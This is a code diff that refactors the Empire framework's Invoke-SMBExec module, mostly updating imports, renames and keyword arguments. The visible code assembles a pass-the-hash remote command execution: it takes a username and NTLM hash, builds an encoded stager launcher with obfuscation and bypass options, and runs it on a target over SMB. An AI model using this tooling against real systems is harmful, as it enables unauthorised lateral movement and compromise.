@@ -1,12 +1,9 @@
 from __future__ import print_function
 
-import pathlib
 from builtins import object, str
 from typing import Dict
 
-from empire.server.common import helpers
-from empire.server.common.module_models import PydanticModule
-from empire.server.utils import data_util
+from empire.server.core.module_models import EmpireModule
 from empire.server.utils.module_util import handle_error_message
 
 
@@ -14,12 +11,11 @@ class Module(object):
     @staticmethod
     def generate(
         main_menu,
-        module: PydanticModule,
+        module: EmpireModule,
         params: Dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
     ):
-
         # staging options
         listener_name = params["Listener"]
         command = params["Command"]
@@ -27,7 +23,7 @@ class Module(object):
         user_name = params["Username"]
         ntlm_hash = params["Hash"]
         domain = params["Domain"]
-        service = params["Service"]
+        params["Service"]
         user_agent = params["UserAgent"]
         proxy = params["Proxy"]
         proxy_creds = params["ProxyCreds"]
@@ -46,7 +42,7 @@ class Module(object):
             )
 
         # read in the common module source code
-        script, err = main_menu.modules.get_module_source(
+        script, err = main_menu.modulesv2.get_module_source(
             module_name=module.script_path,
             obfuscate=obfuscate,
             obfuscate_command=obfuscation_command,
@@ -67,7 +63,7 @@ class Module(object):
                 encode=True,
                 userAgent=user_agent,
                 obfuscate=launcher_obfuscate,
-                obfuscationCommand=launcher_obfuscate_command,
+                obfuscation_command=launcher_obfuscate_command,
                 proxy=proxy,
                 proxyCreds=proxy_creds,
                 bypasses=params["Bypasses"],
@@ -83,7 +79,6 @@ class Module(object):
 
         else:
             Cmd = "%COMSPEC% /C start /b " + command
-            print(helpers.color("[*] Running command:  " + Cmd))
 
         script_end = (
             "Invoke-SMBExec -Target %s -Username %s -Domain %s -Hash %s -Command '%s'"
@@ -97,7 +92,7 @@ class Module(object):
             + ' completed!"'
         )
 
-        script = main_menu.modules.finalize_module(
+        script = main_menu.modulesv2.finalize_module(
             script=script,
             script_end=script_end,
             obfuscate=obfuscate,
